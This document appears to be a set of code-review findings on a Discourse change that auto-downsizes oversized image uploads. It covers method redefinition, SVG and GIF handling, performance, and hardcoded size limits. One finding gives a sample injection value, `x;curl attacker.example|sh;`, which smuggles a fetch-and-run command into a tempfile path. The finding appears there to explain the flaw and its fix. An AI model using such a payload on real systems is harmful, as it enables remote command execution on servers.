findings.title: Second `self.downsize` definition silently replaces the width/height variant
findings.body:
Ruby has no method overloading. `self.downsize(from, to, dimensions, opts={})` at line 149 redefines and replaces `self.downsize(from, to, max_width, max_height, opts={})` at line 145, so the width/height variant can never be called.

Any existing caller using the old form breaks:
- `downsize(from, to, w, h, opts)` raises `ArgumentError` (5 args for 3..4).
- `downsize(from, to, w, h)` binds `h` to `opts`, and `opts[:force_aspect_ratio]` on an Integer raises `TypeError`.

The `rescue` in `convert_with` does not cover either failure. Ruby also emits a "method redefined" warning. Give the new variant a distinct name (e.g. `downsize_by`), or have one method accept both forms.

findings.title: Shell command injection via user-supplied `type` param in tempfile path
findings.body:
For API uploads by URL, the tempfile comes from `FileHelper.download(url, 10.megabytes, "discourse-upload-#{type}")`. `type` is the raw `params.require(:type)`, and Tempfile embeds that prefix verbatim in the file path.

The new loop passes `tempfile.path` to `OptimizedImage.downsize`. That builds the command with `%W{convert #{from}[0] ...}` and runs it through backticks (`convert_with`), so the path is interpreted by a shell.

A `type` such as `x;curl attacker.example|sh;` therefore executes arbitrary commands as the web process user for anyone with API access. Paths must be shell-escaped (`Shellwords.escape`) or the command run with an argv array (`Open3`/`system(*args)`), and `type` should be validated against a whitelist.

findings.title: Large SVG uploads are run through ImageMagick and mangled
findings.body:
`FileHelper.is_image?` matches `.svg`, so any SVG over `max_image_size_kb` enters the downsize loop. There it is rasterized by `convert` and written back in place: as SVG for no-extension Rack tempfiles, or by the `.svg` extension for URL downloads. The original vector content is replaced by an ImageMagick-generated approximation.

`OptimizedImage.create_for` deliberately special-cases SVG (`FileUtils.cp` instead of resizing); this new path does not. It also needlessly feeds user-supplied SVG to ImageMagick's SVG/MSVG coders, a known attack surface. Exclude SVG (and other vector formats) from the auto-downsize.

findings.title: Animated GIFs are either flattened to one frame or never shrunk
findings.body:
`downsize_instructions` reads `#{from}[0]`, i.e. only the first frame. When the gifsicle branch is not taken, an oversized animated GIF is silently replaced by a static first frame before being stored as the user's original upload. That branch is skipped when `allow_animated_thumbnails` is off, or when the tempfile path has no `.gif` extension.

When the gifsicle branch is taken, `resize_instructions_animated` passes `--resize-fit 80%`. gifsicle expects `WxH` geometry, not a percentage, so the command fails every time. `convert_with` returns false, the loop burns all 5 attempts, and the upload is still rejected as too large.

The feature does not work correctly for GIFs in either case.

findings.title: Up to 5 full convert + ImageOptim passes per upload on request/defer thread; failures not detected
findings.body:
Each iteration runs a full ImageMagick re-encode, then `ImageOptim.new.optimize_image!` (inside `convert_with`), on a file of up to 10MB.
- For `synchronous` API uploads this blocks the request worker.
- Otherwise it runs inside `Scheduler::Defer`, which processes deferred work serially per process, so one large upload stalls all other deferred jobs.

Other problems with the loop:
- The return value of `downsize` is ignored, so a failing `convert` is retried 5 times for nothing.
- ImageOptim runs on every intermediate pass instead of once.
- JPEGs are lossily re-encoded up to 5 times, compounding quality loss.

Computing the required scale factor up front and resizing once would avoid all of this.

findings.title: Client size check ignores `max_attachment_size_kb` and hardcodes 10MB for all file types
findings.body:
Previously the limit was `Discourse.SiteSettings['max_' + type + '_size_kb']`, so attachments were checked against `max_attachment_size_kb`. Now every file, including non-image attachments that the server never downsizes, is checked against a hardcoded 10MB.

This has two effects:
- Sites that configured `max_attachment_size_kb` above 10MB can no longer upload attachments their admins allowed; the client blocks them with a misleading "max 10240 KB" message.
- Attachments between the configured limit and 10MB are no longer rejected client-side. They are fully uploaded and then rejected by the server.

Only images should get the raised limit; attachments should keep using `max_attachment_size_kb`.

findings.title: 413 error message reports a hardcoded 10MB limit
findings.body: A 413 comes from the web server/proxy (e.g. nginx `client_max_body_size`), whose limit is independent of this code. The alert now always tells users the maximum is 10240 KB, which is wrong on any deployment configured differently. The same 10MB magic number is also duplicated in three places (two in this file, one in the controller) with no shared setting.

findings.title: No tests for auto-downsizing or the changed OptimizedImage API
